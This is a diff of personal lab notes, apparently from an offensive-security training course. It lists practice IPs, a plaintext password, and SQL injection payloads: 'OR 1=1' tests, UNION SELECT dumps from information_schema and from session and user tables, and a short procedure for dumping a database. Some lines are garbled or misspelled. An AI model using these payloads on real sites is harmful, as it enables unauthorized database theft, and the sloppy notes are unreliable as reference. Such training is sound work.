@@ -6,6 +6,7 @@ PASS: NGhXitkmKFkviR3
 IP: 10.50.37.133
 Linux op stations: 192.168.65.20, 10.50.37.248
 Windws OP: 192.168.65.10, 10.50.38.70
+Practice SQL IP: 10.50.29.140
 
 ```
 # Control Socket
@@ -223,7 +224,7 @@ ile upload
 - Select and Union 
 
 ```
-# SQL Commands  
+# SQL POST METHOD 
 ```
 * mysql -> used to drop into sql server 
 * show databases ; -> dumps databases to screen 
@@ -245,9 +246,7 @@ ile upload
 
 
 
-```
 # SQL Injection on a unsanitized website
-```
 * 'Or 1=" 1 -> veridies i data base i 
 * tURN GET rEQUEST INT RAW DATA 
 * Audi UNION SELECT 1,2,3,4,5 # 
@@ -255,11 +254,22 @@ ile upload
 Steps: 
 1) ID Vuln. Field
 2) ID # of Columns
+3) Dump Database with Golden Statment 
 
 
 ```
 
+# SQL GET METHOD 
+```
+* Selection=2 OR 1=1 
+  - Test every number until you null out 
+* UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
+* UNION SELECT session_id,user_id,statusFROM session.session_log # 
+* UNION SELECT id,name,@@version FROM session.user 
 
+
+
+```
 
 
 
